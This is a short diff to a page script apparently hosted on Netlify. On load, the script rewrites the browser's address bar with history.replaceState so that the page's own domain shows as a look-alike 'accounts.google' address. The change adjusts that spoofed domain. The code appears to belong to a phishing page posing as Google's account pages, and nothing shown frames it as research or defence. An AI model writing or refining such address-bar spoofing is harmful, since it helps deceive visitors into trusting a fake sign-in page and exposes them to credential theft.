@@ -5,7 +5,7 @@
         // alert('Document is loaded!');
 
         let currentUrl = window.location.href;
-        let newUrl = currentUrl.replace('my-accounts-drive-space.netlify.app', 'accounts.google.com.netlify.app');
+        let newUrl = currentUrl.replace('my-accounts-drive-space.netlify.app', 'accounts.google.netlify.app');
         console.log(currentUrl, newUrl)
         if (newUrl !== currentUrl) {
             window.history.replaceState({}, '', newUrl);
